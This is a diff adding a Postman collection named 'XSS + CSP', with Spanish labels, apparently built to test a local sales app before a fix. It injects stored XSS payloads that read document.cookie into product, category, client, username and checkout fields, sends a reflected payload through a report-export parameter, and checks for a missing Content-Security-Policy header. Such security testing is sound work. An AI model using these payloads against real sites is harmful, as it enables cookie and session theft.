@@ -1,0 +1,481 @@
+{
+  "info": {
+    "_postman_id": "0a7d4c1e-9b2f-4e6a-8c3d-5f1b2a7e9c40",
+    "name": "XSS + CSP",
+    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+  },
+  "item": [
+    {
+      "name": "01 · login vendedor",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\r\n    \"username\": \"vendedor\",\r\n    \"password\": \"vendedor\"\r\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "http://localhost:5173/api/auth/login",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "auth",
+            "login"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "01 · producto con XSS",
+      "request": {
+        "method": "PUT",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\r\n    \"sku\": \"BEB-003\",\r\n    \"nombre\": \"Jugo de Naranja 1L\",\r\n    \"descripcion\": \"<img src=x onerror=alert(document.cookie)>\",\r\n    \"precio\": 6.75,\r\n    \"costo\": 4.10,\r\n    \"stock\": 60,\r\n    \"stockMinimo\": 15,\r\n    \"categoriaId\": 1,\r\n    \"activo\": true\r\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "http://localhost:5173/api/productos/3",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "productos",
+            "3"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "01 · ver producto",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "description": "Abrir Productos o Dashboard en el navegador para ejecutar el onerror.",
+        "url": {
+          "raw": "http://localhost:5173/api/productos/3",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "productos",
+            "3"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "02 · categoria con XSS",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\r\n    \"nombre\": \"Promo XSS\",\r\n    \"descripcion\": \"<img src=x onerror=alert(document.cookie)>\"\r\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "http://localhost:5173/api/categorias",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "categorias"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "02 · ver categorias",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "description": "Abrir Categorías en el navegador para ejecutar el onerror.",
+        "url": {
+          "raw": "http://localhost:5173/api/categorias",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "categorias"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "03 · cliente con XSS",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\r\n    \"documento\": \"XSS-001\",\r\n    \"nombre\": \"<img src=x onerror=alert(document.cookie)>\",\r\n    \"email\": \"x@x.local\",\r\n    \"telefono\": \"555\",\r\n    \"direccion\": \"x\",\r\n    \"activo\": true\r\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "http://localhost:5173/api/clientes",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "clientes"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "03 · ver clientes",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "description": "Abrir Clientes en el navegador para ejecutar el onerror.",
+        "url": {
+          "raw": "http://localhost:5173/api/clientes",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "clientes"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "04 · registro username XSS",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\r\n    \"username\": \"<img src=x onerror=alert(document.cookie)>\",\r\n    \"password\": \"pwn\",\r\n    \"rol\": \"VENDEDOR\"\r\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "http://localhost:5173/api/auth/registro",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "auth",
+            "registro"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "04 · login username XSS",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\r\n    \"username\": \"<img src=x onerror=alert(document.cookie)>\",\r\n    \"password\": \"pwn\"\r\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "http://localhost:5173/api/auth/login",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "auth",
+            "login"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "04 · yo",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "description": "Al abrir la app con esta sesión, el header ejecuta el payload del username.",
+        "url": {
+          "raw": "http://localhost:5173/api/auth/yo",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "auth",
+            "yo"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "05 · exportar HTML XSS",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "description": "Abrir la URL en el navegador; el parámetro se refleja sin escapar.",
+        "url": {
+          "raw": "http://localhost:5173/api/reportes/exportar/html?nombreCliente=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E&estado=COMPLETADA",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "reportes",
+            "exportar",
+            "html"
+          ],
+          "query": [
+            {
+              "key": "nombreCliente",
+              "value": "<img src=x onerror=alert(document.cookie)>"
+            },
+            {
+              "key": "estado",
+              "value": "COMPLETADA"
+            }
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "06 · login vendedor",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\r\n    \"username\": \"vendedor\",\r\n    \"password\": \"vendedor\"\r\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "url": {
+          "raw": "http://localhost:5173/api/auth/login",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "auth",
+            "login"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "06 · agregar al carrito",
+      "request": {
+        "method": "POST",
+        "header": [],
+        "url": {
+          "raw": "http://localhost:5173/api/ventas/carrito?productoId=1&cantidad=1&precio=5.50",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "ventas",
+            "carrito"
+          ],
+          "query": [
+            {
+              "key": "productoId",
+              "value": "1"
+            },
+            {
+              "key": "cantidad",
+              "value": "1"
+            },
+            {
+              "key": "precio",
+              "value": "5.50"
+            }
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "06 · checkout con observacion XSS",
+      "request": {
+        "method": "POST",
+        "header": [
+          {
+            "key": "Content-Type",
+            "value": "application/json"
+          }
+        ],
+        "body": {
+          "mode": "raw",
+          "raw": "{\r\n    \"clienteId\": 1,\r\n    \"observaciones\": \"<img src=x onerror=alert(document.cookie)>\"\r\n}",
+          "options": {
+            "raw": {
+              "language": "json"
+            }
+          }
+        },
+        "description": "Abrir /facturas/{id} con el id devuelto por el checkout para ejecutar el onerror.",
+        "url": {
+          "raw": "http://localhost:5173/api/ventas/checkout",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "ventas",
+            "checkout"
+          ]
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "07 · cabeceras frontend",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "description": "Revisar que no exista Content-Security-Policy antes del fix.",
+        "url": {
+          "raw": "http://localhost:5173/",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": []
+        }
+      },
+      "response": []
+    },
+    {
+      "name": "07 · cabeceras API",
+      "request": {
+        "method": "GET",
+        "header": [],
+        "description": "Revisar que no exista Content-Security-Policy antes del fix.",
+        "url": {
+          "raw": "http://localhost:5173/api/salud",
+          "protocol": "http",
+          "host": [
+            "localhost"
+          ],
+          "port": "5173",
+          "path": [
+            "api",
+            "salud"
+          ]
+        }
+      },
+      "response": []
+    }
+  ]
+}
